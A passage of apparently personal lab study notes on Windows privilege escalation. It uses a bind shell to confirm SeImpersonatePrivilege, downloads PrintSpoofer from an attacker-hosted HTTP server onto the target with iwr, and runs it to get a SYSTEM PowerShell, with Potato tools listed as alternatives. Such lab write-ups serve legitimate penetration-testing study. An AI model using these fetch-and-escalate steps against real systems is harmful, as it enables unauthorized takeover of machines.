  3316. <li><p>On CLIENTWK220.</p>
  3317. </li>
  3318. <li><p>Use <code>whoami /priv</code> to display privs of <code>dave</code></p>
  3319. </li>
  3320. </ul>
  3321. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/priv-esc]
  3322. └─$ nc $VM1 4444
  3323. Microsoft Windows [Version 10.0.22000.795]
  3324. (c) Microsoft Corporation. All rights reserved.
  3325. ​
  3326. C:\Users\dave&gt;whoami /priv
  3327. whoami /priv
  3328. ​

  3339. SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

  3341. </code></pre>
  3342. <ul>
  3343. <li>We see <code>dave</code> has SeImpersonatePrivilege.</li>
  3344. <li>We can attempt PrivEsc using <code>PrintSpoofer</code></li>
  3345. <li>Download and serve to tool to the target sys.</li>
  3346. </ul>
  3347. <pre><code class="language-bash">kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
  3348. ...
  3349. 2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]

  3352. Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  3353. </code></pre>
  3354. <ul>
  3355. <li>From bind shell.</li>
  3356. </ul>
  3357. <pre><code class="language-powershell">C:\Users\dave&gt;powershell
  3358. powershell
  3359. Windows PowerShell
  3360. Copyright (C) Microsoft Corporation. All rights reserved.
  3361. ​

  3364. PS C:\Users\dave&gt; iwr -uri http://192.168.45.240/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
  3365. iwr -uri http://192.168.45.240/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

  3367. <ul>
  3368. <li>To obtain an interactive PowerShell session in the context of NT AUTHORITY\SYSTEM with PrintSpoofer.exe.</li>
  3369. <li>Enter <code>powershell.exe</code> as arg for <code>-c</code></li>
  3370. <li>Arg <code>-i</code> to interact with the proc in the current command prompt.</li>
  3371. </ul>
  3372. <pre><code class="language-powershell">PS C:\Users\dave&gt; .\PrintSpoofer64.exe -i -c powershell.exe
  3373. .\PrintSpoofer64.exe -i -c powershell.exe
  3374. [+] Found privilege: SeImpersonatePrivilege

  3381. ​
  3382. PS C:\Windows\system32&gt; whoami

  3386. <ul>
  3387. <li>We have successfully used PrintSpoofer for PrivEsc.</li>
  3388. <li>Obtained PS session as NT AUTHORITY\SYSTEM.</li>
  3389. </ul>
  3390. <p>While <code>PrintSpoofer</code> exploit provided straightforward PrivEsc there are many other tools that can abuse <code>SeImpersonatePrivileges</code>:</p>
  3391. <ul>
  3392. <li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potato</a></li>
  3393. <li>RottenPotato.</li>
  3394. <li>SweetPotato.</li>
  3395. <li>JuicyPotato.</li>
  3396. <li>We should study these as effective alternatives to PrintSpoofer!</li>
  3397. </ul>
